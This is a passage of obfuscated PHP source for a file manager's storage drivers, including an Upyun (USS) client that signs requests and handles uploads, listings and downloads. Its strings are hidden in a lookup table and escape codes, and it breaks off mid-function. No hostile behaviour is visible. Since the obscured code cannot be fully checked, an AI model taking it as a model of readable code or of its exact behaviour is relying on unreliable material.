$ŞÚÄáºÊ[1453] => $ŞÚÄáºÊ[12], $ŞÚÄáºÊ[225] => $ŞÚÄáºÊ[130], $ŞÚÄáºÊ[1365] => $Á¿ìú«ß[$ŞÚÄáºÊ[86]]); $¸ÄËåëŞ = $ŞÚÄáºÊ[238]; $µ¥Òı¶î = $ŞÚÄáºÊ[8] . $this->pathEncode($¹÷›®Ğ’) . $¸ÉÑëˆŠ; $şóÕİ´­ = $this->client->__getSignatureV4($‚‚ŒœáÁ, $ï’éôèì, $¸ÄËåëŞ, $µ¥Òı¶î); if (strpos($¸ÉÑëˆŠ, $ŞÚÄáºÊ[237]) === 0) { if (isset($‚‚ŒœáÁ[$ŞÚÄáºÊ[1451]])) { $Ñ‡ª¸èñ = $‚‚ŒœáÁ[$ŞÚÄáºÊ[1451]]; } else { if (isset($şóÕİ´­[$ŞÚÄáºÊ[1451]])) { $Ñ‡ª¸èñ = $şóÕİ´­[$ŞÚÄáºÊ[1451]]; } else { $Ñ‡ª¸èñ = hash($ŞÚÄáºÊ[1363], $ŞÚÄáºÊ[12]); } } return array($ŞÚÄáºÊ[243] => $şóÕİ´­[$ŞÚÄáºÊ[243]], $ŞÚÄáºÊ[1451] => $Ñ‡ª¸èñ, $ŞÚÄáºÊ[234] => $şóÕİ´­[$ŞÚÄáºÊ[1454]]); } return $şóÕİ´­[$ŞÚÄáºÊ[243]]; } public function listUploadParts($¹›İş£Ñ, $æòùªíö = array()) { $’áˆ‹Ø =& $_SERVER[ñ÷§¡å]; $îÌæÏÅ‹ = str_replace($’áˆ‹Ø[244], $’áˆ‹Ø[12], $æòùªíö[$’áˆ‹Ø[184]]); $ë€«ÈÔŞ = $this->client->listParts($this->bucket, $¹›İş£Ñ, $îÌæÏÅ‹); if (!$ë€«ÈÔŞ) { return !1; } $×Óîæ„€ = $’áˆ‹Ø[1455]; foreach ($ë€«ÈÔŞ as $õşøò³Á) { $×Óîæ„€ .= $’áˆ‹Ø[1456] . "\x3c\x50\141\x72\164\116\165\155\x62\145\162\x3e{$õşøò³Á[$’áˆ‹Ø[1410]]}\74\57\x50\141\162\164\x4e\165\x6d\142\145\x72\x3e\xa" . "\74\105\x54\141\147\x3e{$õşøò³Á[$’áˆ‹Ø[1411]]}\x3c\57\105\124\x61\x67\76\xa" . $’áˆ‹Ø[1457]; } $×Óîæ„€ .= $’áˆ‹Ø[1458]; $úö¸æÎØ = array(); $ÏãÚ³ = explode($’áˆ‹Ø[193], $this->getHost()); $÷êŸ¶‡‚ = array($’áˆ‹Ø[1452] => $ÏãÚ³[1], $’áˆ‹Ø[225] => $’áˆ‹Ø[130], $’áˆ‹Ø[1365] => strlen($×Óîæ„€)); $§¹ì— = $’áˆ‹Ø[236]; $¯“Ş¤«ï = $’áˆ‹Ø[8] . $this->pathEncode($¹›İş£Ñ) . $æòùªíö[$’áˆ‹Ø[184]]; $ğßÄæ’ = $this->client->__getSignatureV4($úö¸æÎØ, $÷êŸ¶‡‚, $§¹ì—, $¯“Ş¤«ï, $×Óîæ„€); return array($’áˆ‹Ø[243] => $ğßÄæ’[$’áˆ‹Ø[243]], $’áˆ‹Ø[234] => $ğßÄæ’[$’áˆ‹Ø[1454]], $’áˆ‹Ø[245] => $ë€«ÈÔŞ, $’áˆ‹Ø[1451] => $ğßÄæ’[$’áˆ‹Ø[1451]]); } public function link($‰¾³ìØ, $ıÒŠ¦¸ = array()) { return parent::link($‰¾³ìØ, $ıÒŠ¦¸); } public function fileOut($ƒ÷ö¬¬¸, $‡­ë¥â› = false, $ğ¤Ì§ï± = false, $½·š·Ö = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ñ÷§¡å][1459])) { return parent::fileOutServer($ƒ÷ö¬¬¸, $‡­ë¥â›, $ğ¤Ì§ï±, $½·š·Ö); } parent::fileOut($ƒ÷ö¬¬¸, $‡­ë¥â›, $ğ¤Ì§ï±, $½·š·Ö); } public function fileOutImage($‰¤Ÿâö‹, $³”êÅê’ = 250) { if (strstr($this->endpoint, $_SERVER[ñ÷§¡å][1459])) { return parent::fileOutImageServer($‰¤Ÿâö‹, $³”êÅê’); } parent::fileOutImage($‰¤Ÿâö‹, $³”êÅê’); } public function fileOutLink($…™ğ°ïÖ) { $İÔš¸Â† =& $_SERVER[ñ÷§¡å]; if (substr($…™ğ°ïÖ, 0, 7) == $İÔš¸Â†[1332]) { $…™ğ°ïÖ = $İÔš¸Â†[1333] . substr($…™ğ°ïÖ, 7); } header($İÔš¸Â†[171] . $…™ğ°ïÖ); die; } public function getHost() { $ã¤ŞÎÌ³ =& $_SERVER[ñ÷§¡å]; $ĞÎ¨ÅŒì = str_rtrim(parent::getHost(), $ã¤ŞÎÌ³[8] . $this->bucket); $ĞÎ¨ÅŒì = explode($ã¤ŞÎÌ³[193], $ĞÎ¨ÅŒì); return $ĞÎ¨ÅŒì[0] . $ã¤ŞÎÌ³[193] . $this->bucket . $ã¤ŞÎÌ³[10] . $ĞÎ¨ÅŒì[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($–¾óÄä, $¸—ƒù”† = 0) { parent::__construct(); $this->source = $–¾óÄä; $this->sourceSize = $¸—ƒù”†; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ƒÃ‹‚›İ = false) { return $this->sourceSize; } public function getContent($¹«ñ“Åû = false) { return $this->fileSubstr($¹«ñ“Åû, 0, $this->sourceSize); } public function fileSubstr($û“Ùµçø = false, $´•şï»‚ = 0, $½¢£êÚ = 0) { if (!$½¢£êÚ) { $½¢£êÚ = $this->sourceSize; } $È¿àÂÕ‡ = $this->sourceSize - $´•şï»‚; if ($½¢£êÚ >= $È¿àÂÕ‡) { $½¢£êÚ = $È¿àÂÕ‡; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $´•şï»‚, $½¢£êÚ); } if ($this->sourceType == self::TYPE_FILE) { if ($½¢£êÚ <= 0) { return $_SERVER[ñ÷§¡å][12]; } $ì¾õ’Á– = ftell($this->source); fseek_64($this->source, $ì¾õ’Á– + $´•şï»‚); $‡²Ÿ­ë› = @fread($this->source, $½¢£êÚ); fseek_64($this->source, $ì¾õ’Á–); return $‡²Ÿ­ë›; } } public function hashMd5($Å—Âİ›ª = false) { return md5($this->getContent()); } public static function hash($áâì·×¥, $¾Ûï†—î = 0) { $Ôüãè† = new PathDriverStream($áâì·×¥, $¾Ûï†—î); return $Ôüãè†->hashSimple($áâì·×¥); } public static function md5($ …Ä¸¤ƒ, $¹Š©ØÒ = 0) { $å»šì‹ = new PathDriverStream($ …Ä¸¤ƒ, $¹Š©ØÒ); return $å»šì‹->hashMd5($ …Ä¸¤ƒ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\57\166\60\56\x61\x70\x69\x2e\x75\160\171\x75\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÈÊÛéÑæ) { parent::__construct(); $this->_init($ÈÊÛéÑæ); } public function _init($áù›ú¸¹) { $¤«îÙ· =& $_SERVER[ñ÷§¡å]; foreach ($áù›ú¸¹ as $Úøö¸¡ì => $¾Í’”ƒª) { if (isset($this->{$Úøö¸¡ì})) { $this->{$Úøö¸¡ì} = $¾Í’”ƒª; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¤«îÙ·[1460] . LNG($¤«îÙ·[1391])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($õ¹éØœ¼, $È°œº­ = "\107\105\x54") { $Ş¹…Şü =& $_SERVER[ñ÷§¡å]; $½™Á·úš = gmdate($Ş¹…Şü[1424]); $ÓÛŒ³é = base64_encode(hash_hmac($Ş¹…Şü[1461], "{$È°œº­}\x26{$õ¹éØœ¼}\46{$½™Á·úš}", md5("{$this->userpass}"), !0)); $„’·Á§¸ = array("\101\x75\164\x68\x6f\162\x69\x7a\x61\x74\151\157\156\72\125\x50\131\x55\x4e\40{$this->username}\x3a{$ÓÛŒ³é}", "\104\x61\164\x65\x3a{$½™Á·úš}"); return $„’·Á§¸; } public function ussRequest($­ƒäÒ‡, $œ¨ç”› = "\107\105\x54", $ª”¶Ì¡¸ = false, $®ÒêäÁ = false, $Ä„ü¨½ = false) { $ÕÆ­ŞĞ =& $_SERVER[ñ÷§¡å]; $­ƒäÒ‡ = trim($­ƒäÒ‡, $ÕÆ­ŞĞ[8]); $ùÖÛ²Ö = "\x2f{$this->bucket}\x2f{$­ƒäÒ‡}"; $–¿Ä©¦á = $this->ussHeaders($ùÖÛ²Ö, $œ¨ç”›); if ($®ÒêäÁ) { $–¿Ä©¦á = array_merge($–¿Ä©¦á, $®ÒêäÁ); } $òü¸‡Õ­ = url_request($this->endpoint . $ùÖÛ²Ö, $œ¨ç”›, $ª”¶Ì¡¸, $–¿Ä©¦á, $Ä„ü¨½); if (!$òü¸‡Õ­) { return array($ÕÆ­ŞĞ[1198] => !1, $ÕÆ­ŞĞ[1200] => $ÕÆ­ŞĞ[1462]); } if (strtolower($œ¨ç”›) == $ÕÆ­ŞĞ[206] || in_array($òü¸‡Õ­[$ÕÆ­ŞĞ[1198]], array($ÕÆ­ŞĞ[1317], $ÕÆ­ŞĞ[1463]))) { $ª”¶Ì¡¸ = $òü¸‡Õ­[$ÕÆ­ŞĞ[1464]]; } else { $ª”¶Ì¡¸ = json_decode($òü¸‡Õ­[$ÕÆ­ŞĞ[1200]], !0); if (!$ª”¶Ì¡¸) { $ª”¶Ì¡¸ = $òü¸‡Õ­[$ÕÆ­ŞĞ[1200]]; } else { if (!$òü¸‡Õ­[$ÕÆ­ŞĞ[763]] && isset($ª”¶Ì¡¸[$ÕÆ­ŞĞ[1465]])) { $ª”¶Ì¡¸ = $ª”¶Ì¡¸[$ÕÆ­ŞĞ[1465]]; } } } return array($ÕÆ­ŞĞ[1198] => $òü¸‡Õ­[$ÕÆ­ŞĞ[763]], $ÕÆ­ŞĞ[1200] => $ª”¶Ì¡¸); } public function mkfile($Å×¶ŸĞŠ, $öÏ‰«Š = '', $·ƒŸóíÜ = REPEAT_RENAME) { if ($this->setContent($Å×¶ŸĞŠ, $öÏ‰«Š)) { return $this->getPathOuter($Å×¶ŸĞŠ); } return !1; } public function mkdir($”ì©ç’Ú, $Ì­¬¸â‘ = REPEAT_SKIP) { $¾ñ”÷‘À =& $_SERVER[ñ÷§¡å]; $¸àë½³ = trim($”ì©ç’Ú, $¾ñ”÷‘À[8]); if ($this->_isFolder($¸àë½³)) { return $this->getPathOuter($¸àë½³); } $ïˆêå˜ = array($¾ñ”÷‘À[1466]); $ûŒÀïøÁ = $this->ussRequest($¸àë½³, $¾ñ”÷‘À[236], !1, $ïˆêå˜); return $ûŒÀïøÁ[$¾ñ”÷‘À[1198]] ? $this->getPathOuter($¸àë½³) : !1; } public function copyFile($şì§œê, $Õö²Œï•) { $Èøƒ¡Â÷ =& $_SERVER[ñ÷§¡å]; $ ¸ªÌÎˆ = array($Èøƒ¡Â÷[1467] . "\57{$this->bucket}\x2f{$şì§œê}", $Èøƒ¡Â÷[1468]); $ö€ÇÁ–ï = $this->ussRequest($Õö²Œï•, $Èøƒ¡Â÷[238], !1, $ ¸ªÌÎˆ); return $ö€ÇÁ–ï[$Èøƒ¡Â÷[1198]] ? !0 : $this->getPathOuter($Õö²Œï•); } public function moveFile($ã«–¦×œ, $±Îšıã) { $Ô€“·’ª =& $_SERVER[ñ÷§¡å]; $€¹½ÂŠ‹ = array($Ô€“·’ª[1469] . "\57{$this->bucket}\x2f{$ã«–¦×œ}", $Ô€“·’ª[1468]); $‰Ô²ç´ = $this->ussRequest($±Îšıã, $Ô€“·’ª[238], !1, $€¹½ÂŠ‹); return $‰Ô²ç´[$Ô€“·’ª[1198]] ? !0 : $this->getPathOuter($±Îšıã); } public function delFile($Á·ñ¿Âë) { $ªÖï¡Ä¤ =& $_SERVER[ñ÷§¡å]; $õ©ó±È = $this->ussRequest($Á·ñ¿Âë, $ªÖï¡Ä¤[1470]); return $õ©ó±È[$ªÖï¡Ä¤[1198]] ? !0 : !1; } public function delFolder($Ğ½Ëƒ›¦) { $¡ô¼–óü =& $_SERVER[ñ÷§¡å]; if (!$this->exist($Ğ½Ëƒ›¦)) { return !0; } $this->listItemCache = !1; $ûÀÉú´Ã = $Š¹–¯øç = array(); $this->fileList($Ğ½Ëƒ›¦, $ûÀÉú´Ã, $Š¹–¯øç, !0); $this->listItemCache = !0; foreach ($Š¹–¯øç as $¦ƒØËãÖ) { $İé¶ÃÃê = $this->ussRequest($¦ƒØËãÖ[$¡ô¼–óü[32]], $¡ô¼–óü[1470]); if (!$İé¶ÃÃê[$¡ô¼–óü[1198]]) { return !1; } } foreach ($ûÀÉú´Ã as $ŞÄïŠŒâ) { $İé¶ÃÃê = $this->ussRequest($ŞÄïŠŒâ, $¡ô¼–óü[1470]); if (!$İé¶ÃÃê[$¡ô¼–óü[1198]]) { return !1; } } $İé¶ÃÃê = $this->ussRequest($Ğ½Ëƒ›¦, $¡ô¼–óü[1470]); return $İé¶ÃÃê[$¡ô¼–óü[1198]]; } public function rename($ñ‡÷Ôœ, $ü›å°Éº) { if ($this->isFile($ñ‡÷Ôœ)) { $ü›å°Éº = get_path_father($ñ‡÷Ôœ) . $ü›å°Éº; return $this->moveFile($ñ‡÷Ôœ, $ü›å°Éº); } return $this->renameObject($ñ‡÷Ôœ, $ü›å°Éº); } public function fileInfo($ÂÍî†Õ, $Ö»ÅÆÂ­ = false, $©¤ÀÂÁ¶ = array()) { $ñÍéÇ© =& $_SERVER[ñ÷§¡å]; $™ûÌêûâ = array($ñÍéÇ©[32] => $this->pathThis($ÂÍî†Õ), $ñÍéÇ©[94] => $this->getPathOuter($ñÍéÇ©[8] . $ÂÍî†Õ), $ñÍéÇ©[33] => $ñÍéÇ©[209], $ñÍéÇ©[86] => isset($©¤ÀÂÁ¶[$ñÍéÇ©[86]]) ? $©¤ÀÂÁ¶[$ñÍéÇ©[86]] : 0, $ñÍéÇ©[184] => $this->ext($ÂÍî†Õ)); if ($Ö»ÅÆÂ­) { return $™ûÌêûâ; } $™ûÌêûâ[$ñÍéÇ©[210]] = $™ûÌêûâ[$ñÍéÇ©[95]] = 0; $™ûÌêûâ[$ñÍéÇ©[211]] = $™ûÌêûâ[$ñÍéÇ©[212]] = !0; if (empty($©¤ÀÂÁ¶)) { $©¤ÀÂÁ¶ = $this->objectMeta($ÂÍî†Õ); if (!$©¤ÀÂÁ¶) { return $™ûÌêûâ; } } $™ûÌêûâ[$ñÍéÇ©[210]] = intval($©¤ÀÂÁ¶[$ñÍéÇ©[1471]]); $™ûÌêûâ[$ñÍéÇ©[95]] = intval($©¤ÀÂÁ¶[$ñÍéÇ©[1472]]); $™ûÌêûâ[$ñÍéÇ©[86]] = $©¤ÀÂÁ¶[$ñÍéÇ©[86]]; return $™ûÌêûâ; } public function folderInfo($ÈÌÄúì¯, $öµ‚î› = false) { $êÃ°å­Õ =& $_SERVER[ñ÷§¡å]; $³èÆÕ±³ = array($êÃ°å­Õ[32] => $this->pathThis($ÈÌÄúì¯), $êÃ°å­Õ[94] => $this->getPathOuter($êÃ°å­Õ[8] . $ÈÌÄúì¯), $êÃ°å­Õ[33] => $êÃ°å­Õ[85]); if ($öµ‚î›) { return $³èÆÕ±³; } $³èÆÕ±³[$êÃ°å­Õ[210]] = $³èÆÕ±³[$êÃ°å­Õ[95]] = 0; $³èÆÕ±³[$êÃ°å­Õ[211]] = $³èÆÕ±³[$êÃ°å­Õ[212]] = !0; if (empty($¾Îúóùó)) { $¾Îúóùó = $this->objectMeta($ÈÌÄúì¯); if (!$¾Îúóùó) { return $³èÆÕ±³; } } $³èÆÕ±³[$êÃ°å­Õ[210]] = intval($¾Îúóùó[$êÃ°å­Õ[1471]]); $³èÆÕ±³[$êÃ°å­Õ[95]] = intval($¾Îúóùó[$êÃ°å­Õ[1472]]); return $³èÆÕ±³; } private function listObjs($°óİûÌ, $œşÛ‡ş = 0, $­÷ÀÌ¨ = 1000) { $ä¶äü—ô =& $_SERVER[ñ÷§¡å]; $»üœ»°ı = array($ä¶äü—ô[1473], $ä¶äü—ô[1474] . $­÷ÀÌ¨); if ($œşÛ‡ş) { $»üœ»°ı[] = $ä¶äü—ô[1475] . $œşÛ‡ş; } $­ÍË„Ğ» = $this->ussRequest($°óİûÌ, $ä¶äü—ô[240], !1, $»üœ»°ı); return !$­ÍË„Ğ»[$ä¶äü—ô[1198]] ? !1 : $­ÍË„Ğ»[$ä¶äü—ô[1200]]; } private function fileList($êÌ¨­“¸, &$º¨½Ù£±, &$ë¹Ğããª, $›°ƒŠÀÇ = false) { $¤úÏ£Ïµ =& $_SERVER[ñ÷§¡å]; $ÉÆ»áŠâ = $¤úÏ£Ïµ[12]; $­…›ËÃö = 1000; $ˆ¿¶ş‘¿ = rtrim($êÌ¨­“¸, $¤úÏ£Ïµ[8]) . $¤úÏ£Ïµ[8]; while (!0) { check_abort(); $ĞœçÉ¢‹ = $this->listObjs($êÌ¨­“¸, $ÉÆ»áŠâ, $­…›ËÃö); if (!$ĞœçÉ¢‹) { return !1; } $ÉÆ»áŠâ = isset($ĞœçÉ¢‹[$¤úÏ£Ïµ[1476]]) ? $ĞœçÉ¢‹[$¤úÏ£Ïµ[1476]] : $¤úÏ£Ïµ[12]; $àÏâ¶â¬ = isset($ĞœçÉ¢‹[$¤úÏ£Ïµ[1477]]) ? $ĞœçÉ¢‹[$¤úÏ£Ïµ[1477]] : array(); foreach ($àÏâ¶â¬ as $ÅªåÒöŠ) { $À¶±·àñ = $ÅªåÒöŠ[$¤úÏ£Ïµ[33]] == $¤úÏ£Ïµ[85] ? !0 : !1; $À±—¾¡ = ltrim($ˆ¿¶ş‘¿ . $ÅªåÒöŠ[$¤úÏ£Ïµ[32]], $¤úÏ£Ïµ[8]) . ($À¶±·àñ ? $¤úÏ£Ïµ[8] : $¤úÏ£Ïµ[12]); $ºÃèìï“ = array($¤úÏ£Ïµ[32] => $À±—¾¡, $¤úÏ£Ïµ[33] => $À¶±·àñ ? $¤úÏ£Ïµ[85] : $¤úÏ£Ïµ[209], $¤úÏ£Ïµ[86] => $ÅªåÒöŠ[$¤úÏ£Ïµ[346]], $¤úÏ£Ïµ[1472] => $ÅªåÒöŠ[$¤úÏ£Ïµ[1478]]); $this->cacheMethodInfoSet($À±—¾¡, $À¶±·àñ, $ºÃèìï“); if ($À¶±·àñ) { $º¨½Ù£±[] = $À±—¾¡; if ($›°ƒŠÀÇ) { $this->fileList($À±—¾¡, $º¨½Ù£±, $ë¹Ğããª, $›°ƒŠÀÇ); } continue; } $ë¹Ğããª[] = $ºÃèìï“; } if (count($àÏâ¶â¬) < $­…›ËÃö) { break; } } $this->cacheMethodInfoSet($êÌ¨­“¸, !0); } public function listPath($š¡’ë—, $ƒ™ÅÌ¥ = false) { $ãÚ¹¹÷İ =& $_SERVER[ñ÷§¡å]; $çñÈñí™ = $±¸°Ù±ô = array(); $this->fileList($š¡’ë—, $çñÈñí™, $±¸°Ù±ô); foreach ($çñÈñí™ as $¾’šôÃé => $°ˆáÊ™Ì) { $çñÈñí™[$¾’šôÃé] = $this->folderInfo($°ˆáÊ™Ì, $ƒ™ÅÌ¥); } foreach ($±¸°Ù±ô as $¾’šôÃé => $°ˆáÊ™Ì) { $±¸°Ù±ô[$¾’šôÃé] = $this->fileInfo($°ˆáÊ™Ì[$ãÚ¹¹÷İ[32]], $ƒ™ÅÌ¥, $°ˆáÊ™Ì); } return array($ãÚ¹¹÷İ[92] => $çñÈñí™, $ãÚ¹¹÷İ[93] => $±¸°Ù±ô); } public function has($èƒÆğª, $¿’îÅ„ = false, $®ûù®è = true) { $ëïÏ¥‰ =& $_SERVER[ñ÷§¡å]; $Õ©ÌÌñÁ = $ëïÏ¥‰[12]; $Ô²ìøí× = 500; $¬ÛÌğü÷ = 0; $­›½â = 0; $–ü¦Î = rtrim($èƒÆğª, $ëïÏ¥‰[8]) . $ëïÏ¥‰[8]; while (!0) { check_abort(); $³Æ€ŠÖ° = $this->listObjs($èƒÆğª, $Õ©ÌÌñÁ, $Ô²ìøí×); if (!$³Æ€ŠÖ°) { return !1; } $Õ©ÌÌñÁ = isset($³Æ€ŠÖ°[$ëïÏ¥‰[1476]]) ? $³Æ€ŠÖ°[$ëïÏ¥‰[1476]] : $ëïÏ¥‰[12]; $Ò¤²ÍŠ = isset($³Æ€ŠÖ°[$ëïÏ¥‰[1477]]) ? $³Æ€ŠÖ°[$ëïÏ¥‰[1477]] : array(); if (empty($Ò¤²ÍŠ)) { break; } $ˆöÀŞÑ¿ = array_filter($Ò¤²ÍŠ, function ($—Î¾‰Ã«) { $Ã¨¢ª =& $_SERVER[ñ÷§¡å]; return $—Î¾‰Ã«[$Ã¨¢ª[33]] == $Ã¨¢ª[85]; }); $•šÂ­£¥ = count($Ò¤²ÍŠ); $ˆöÀŞÑ¿ = count($ˆöÀŞÑ¿); $­İÌ¾â‰ = $•šÂ­£¥ - $ˆöÀŞÑ¿; if ($¿’îÅ„) { $­›½â += $ˆöÀŞÑ¿; $¬ÛÌğü÷ += $­İÌ¾â‰; if ($•šÂ­£¥ < $Ô²ìøí×) { break; } continue; } if ($®ûù®è) { if ($­İÌ¾â‰) { return !0; } } else { if ($ˆöÀŞÑ¿) { return !0; } } if ($•šÂ­£¥ < $Ô²ìøí×) { break; } } if ($¿’îÅ„) { return array($ëïÏ¥‰[217] => $¬ÛÌğü÷, $ëïÏ¥‰[218] => $­›½â); } return !1; } public function listAll($ÖÅø×°¾) { $¢½Êùã =& $_SERVER[ñ÷§¡å]; $ò›ç¸óå = $ûŠ‘Ç• = array(); $this->fileList($ÖÅø×°¾, $ò›ç¸óå, $ûŠ‘Ç•, !0); $‚ªŒÉÃ— = array(); foreach ($ûŠ‘Ç• as $ëéşâï) { $‚ªŒÉÃ—[$ëéşâï[$¢½Êùã[32]]] = $ëéşâï[$¢½Êùã[86]]; } foreach ($ò›ç¸óå as $ëéşâï) { if (is_string($ëéşâï)) { $‚ªŒÉÃ—[$ëéşâï] = 0; } } return $this->listAllFiles($ÖÅø×°¾, array_keys($‚ªŒÉÃ—), $‚ªŒÉÃ—); } public function canRead($ÒüÃ™½¢) { return $this->exist($ÒüÃ™½¢) ? !0 : !1; } public function canWrite($é£Íƒ¸) { return $this->exist($é£Íƒ¸) ? !0 : !1; } public function getContent($ìÔìàÏ ) { return $this->fileSubstr($ìÔìàÏ , 0, -1); } public function setContent($úö‡ïË©, $Äº¶úŸÉ = '') { $È˜üèé =& $_SERVER[ñ÷§¡å]; if (!$Äº¶úŸÉ) { $êæ¤¿… = $this->ussRequest($úö‡ïË©, $È˜üèé[236]); return $êæ¤¿…[$È˜üèé[1198]]; } $ê·Î°ÏÓ = $this->tempFile($this->pathThis($úö‡ïË©)); file_put_contents($ê·Î°ÏÓ, $Äº¶úŸÉ); if ($this->upload($úö‡ïË©, $ê·Î°ÏÓ)) { $this->tempFileRemve($ê·Î°ÏÓ); return !0; } return !1; } public function fileSubstr($Ÿ§ëæ Ç, $§ƒÔÛ¼ö, $½ÇÔ¶ğ) { $¤„šš =& $_SERVER[ñ÷§¡å]; if (!($ÊßÒÔ÷ = $this->link($Ÿ§ëæ Ç))) { return !1; } $¤×Ş½î = !1; if ($½ÇÔ¶ğ > 0) { $½†À›îš = $§ƒÔÛ¼ö + $½ÇÔ¶ğ - 1; $¤×Ş½î = array($¤„šš[1439] . $§ƒÔÛ¼ö . $¤„šš[395] . $½†À›îš); } $¢§ñÜ¬Ù = url_request($ÊßÒÔ÷, $¤„šš[240], !1, $¤×Ş½î); return $¢§ñÜ¬Ù[$¤„šš[763]] ? $¢§ñÜ¬Ù[$¤„šš[1200]] : !1; } public function upload($££  ¸ö, $‘»Ê«, $¥”æî±Ô = false, $›ÜşÁÛÃ = REPEAT_REPLACE) { $¨…ÊŠƒ÷ =& $_SERVER[ñ÷§¡å]; $ÔÅ§ä†É = IO::size($‘»Ê«); if ($ÔÅ§ä†É <= 1024 * 1024 * 200) { $ıÖ¿Œ€ = array($¨…ÊŠƒ÷[1479] . $‘»Ê«); $ÌùÅôÛ‚ = $this->ussRequest($££  ¸ö, $¨…ÊŠƒ÷[238], $ıÖ¿Œ€); return $ÌùÅôÛ‚[$¨…ÊŠƒ÷[1198]] ? $this->getPathOuter($££  ¸ö) : !1; } $¿å‰øóŸ = 1024 * 1024 * 10; $Ş‰’ì½ë = array($¨…ÊŠƒ÷[1480], $¨…ÊŠƒ÷[1481] . $ÔÅ§ä†É, $¨…ÊŠƒ÷[1482], $¨…ÊŠƒ÷[1483] . $¿å‰øóŸ); $ÌùÅôÛ‚ = $this->ussRequest($££  ¸ö, $¨…ÊŠƒ÷[238], !1, $Ş‰’ì½ë); if (!$ÌùÅôÛ‚[$¨…ÊŠƒ÷[1198]]) { return !1; } $—éü´¤Ù = $ÌùÅôÛ‚[$¨…ÊŠƒ÷[1200]]; $Ó§ Ùç³ = 0; $“ƒùÇÛÄ = $—éü´¤Ù[$¨…ÊŠƒ÷[1484]]; $­¹¼…› = fopen($‘»Ê«, $¨…ÊŠƒ÷[1388]); if (!$­¹¼…›) { return !1; } do { $Ï®ë¶¥ = $—éü´¤Ù[$¨…ÊŠƒ÷[1485]]; fseek_64($­¹¼…›, $Ó§ Ùç³); $ ¡Ì«Û† = fread($­¹¼…›, $Ï®ë¶¥); $Ï»ş† = 0; do { $Ï»ş†++; $—éü´¤Ù = $this->uploadPart($££  ¸ö, $—éü´¤Ù, $ ¡Ì«Û†); } while (!$—éü´¤Ù && $Ï»ş† < 3); if (!$—éü´¤Ù) { return !1; } $“ƒùÇÛÄ = $—éü´¤Ù[$¨…ÊŠƒ÷[1484]]; $Ó§ Ùç³ += $Ï®ë¶¥; } while ($“ƒùÇÛÄ != -1); fclose($­¹¼…›); $Ş‰’ì½ë = array($¨…ÊŠƒ÷[1486], $¨…ÊŠƒ÷[1487] . $—éü´¤Ù[$¨…ÊŠƒ÷[1488]], $¨…ÊŠƒ÷[1482]); $ÌùÅôÛ‚ = $this->ussRequest($££  ¸ö, $¨…ÊŠƒ÷[238], !1, $Ş‰’ì½ë); return $ÌùÅôÛ‚[$¨…ÊŠƒ÷[1198]] ? $this->getPathOuter($ãÒ¾ä¯´) : !1; } private function uploadPart($Ë•èÌÛ, $æÊ ­Œ, &$ÃÅ÷Â¦Å) { $ü‚ÑÁÊˆ =& $_SERVER[ñ÷§¡å]; $È…èüâµ = array($ü‚ÑÁÊˆ[1489], $ü‚ÑÁÊˆ[1487] . $æÊ ­Œ[$ü‚ÑÁÊˆ[1488]], $ü‚ÑÁÊˆ[1490] . $æÊ ­Œ[$ü‚ÑÁÊˆ[1484]], $ü‚ÑÁÊˆ[152] . $æÊ ­Œ[$ü‚ÑÁÊˆ[1485]]); $Şâ¼÷É€ = $this->ussRequest($Ë•èÌÛ, $ü‚ÑÁÊˆ[238], $ÃÅ÷Â¦Å, $È…èüâµ); return !$Şâ¼÷É€[$ü‚ÑÁÊˆ[1198]] ? $Şâ¼÷É€[$ü‚ÑÁÊˆ[1198]] : $Şâ¼÷É€[$ü‚ÑÁÊˆ[1200]]; } public function uploadFormData($µ²ûÉŸ„, $™Ëì¶™ƒ = 3600) { return $this->uploadPolicy($µ²ûÉŸ„, $™Ëì¶™ƒ); } public function multiUploadFormData($ö›Ü‡øÀ, $èı‡Á‡Ü = 3600) { $¦—İ“æ¨ =& $_SERVER[ñ÷§¡å]; $ÆùÌâøĞ = (int) $GLOBALS[$¦—İ“æ¨[7]][$¦—İ“æ¨[86]]; return $this->uploadPolicy($ö›Ü‡øÀ, $èı‡Á‡Ü, $ÆùÌâøĞ); } private function uploadPolicy($»°êÊÌ³, $’“öù = 3600, $ù¢‰êÉ© = 0) { $Û§å£¾ =& $_SERVER[ñ÷§¡å]; $²‡Ê™‡“ = $Û§å£¾[8] . $this->bucket; $Ü×‡´¢Ç = gmdate($Û§å£¾[1424]); $ãããŠ•» = array($Û§å£¾[1491] => $this->bucket, $Û§å£¾[1492] => $»°êÊÌ³, $Û§å£¾[1493] => time() + $’“öù, $Û§å£¾[1494] => $Ü×‡´¢Ç); if ($ù¢‰êÉ©) { $ãããŠ•»[$Û§å£¾[1404]] = $ù¢‰êÉ©; } $ÈÛşçıá = base64_encode(json_encode($ãããŠ•»)); $ŒüÑ„¾€ = base64_encode(hash_hmac($Û§å£¾[1461], "\x50\117\123\124\x26{$²‡Ê™‡“}\x26{$Ü×‡´¢Ç}\46{$ÈÛşçıá}", md5("{$this->userpass}"), !0)); $æª¨¯‡’ = array($Û§å£¾[1329] => $ÈÛşçıá, $Û§å£¾[1495] => "\125\x50\x59\125\x4e\40{$this->username}\x3a{$ŒüÑ„¾€}", $Û§å£¾[191] => $this->endpoint . $²‡Ê™‡“); return $æª¨¯‡’; } public function download($ï»öÃƒü, $·ú°Š®) { $Ù×Ô¶™ï = IO::getPathInner(IO::mkfile($·ú°Š®)); if (!($Ë„Í¨À¯ = $this->link($ï»öÃƒü))) { return !1; } $Ëªö¼…à = 0; $ƒè–üó¹ = 1024 * 200; $Òê‚›ª‹ = fopen($Ù×Ô¶™ï, $_SERVER[ñ÷§¡å][1445]); while (!0) { $¾§ŒÀÚî = $this->fileSubstr($ï»öÃƒü, $Ëªö¼…à, $ƒè–üó¹); if ($¾§ŒÀÚî === !1) { return !1; } fwrite($Òê‚›ª‹, $¾§ŒÀÚî); 